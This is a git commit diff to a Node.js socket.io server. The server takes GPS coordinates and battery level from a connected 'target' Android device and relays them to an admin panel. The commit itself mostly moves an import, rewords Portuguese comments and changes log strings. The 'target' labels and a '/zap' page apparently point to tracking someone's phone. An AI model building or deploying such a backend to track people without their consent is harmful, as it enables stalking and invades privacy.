b17dc128e7565311c4dc5a6560fe4f858dab54ff
madny2024 <criadordecena@gmail.com>
2025-12-11 03:41:53 -0300

    Correcao Final Linux

--- server.js
+++ server.js
@@ -1,13 +1,13 @@
 const express = require('express');
 const app = express();
 const http = require('http').createServer(app);
-const path = require('path'); // <--- A MÁGICA ESTÁ AQUI
 const io = require('socket.io')(http, {
-    cors: { origin: "*" }
+    cors: { origin: "*" } // Permite conexão de qualquer lugar
 });
+const path = require('path'); // <--- IMPORTANTE PARA O RENDER
 
-// --- CORREÇÃO DE CAMINHOS PARA NUVEM ---
-// Isso garante que o Render ache a pasta 'public' e 'views'
+// --- CONFIGURAÇÃO BLINDADA DE CAMINHOS ---
+// Diz pro servidor exatamente onde estão as pastas, independente se é Windows ou Linux
 app.use(express.static(path.join(__dirname, 'public')));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
@@ -21,15 +21,15 @@ app.get('/zap', (req, res) => res.render('zap'));
 let lastKnownData = null;
 
 io.on('connection', (socket) => {
+    // Pega a "etiqueta" de quem conectou (se é Alvo ou Admin)
     const role = socket.handshake.query.role;
 
     if (role === 'target') {
         console.log(`[ALVO CONECTADO] ID: ${socket.id}`);
         
         socket.on('report_location', (data) => {
-            // Guarda na memória
             lastKnownData = {
-                deviceId: "ALVO_01",
+                deviceId: "ALVO_ANDROID",
                 lat: data.lat,
                 lng: data.lng,
                 battery: data.battery,
@@ -37,25 +37,25 @@ io.on('connection', (socket) => {
                 timestamp: new Date().toLocaleTimeString()
             };
             
-            // Manda para o site
+            // Envia para o Painel
             io.emit('gps_update', lastKnownData);
-            console.log(`[GPS] Lat: ${data.lat} / Lng: ${data.lng}`);
+            console.log(`[GPS RECEBIDO] Lat: ${data.lat} | Lng: ${data.lng}`);
         });
 
         socket.on('disconnect', () => {
-             if(lastKnownData) lastKnownData.status = "OFFLINE";
+             console.log('[ALVO PERDIDO]');
              io.emit('target_status', { status: 'OFFLINE' });
         });
 
     } else {
-        // Se o Site conectar e já tivermos dados, enviamos na hora!
+        // Se for o Painel (Admin), envia a última posição logo de cara
         if (lastKnownData) {
             socket.emit('gps_update', lastKnownData);
         }
     }
 });
 
-// Porta automática do Render ou 3000 local
+// Porta automática do Render
 const PORT = process.env.PORT || 3000;
 http.listen(PORT, () => {
     console.log(`[SISTEMA] Rodando na porta ${PORT}`);
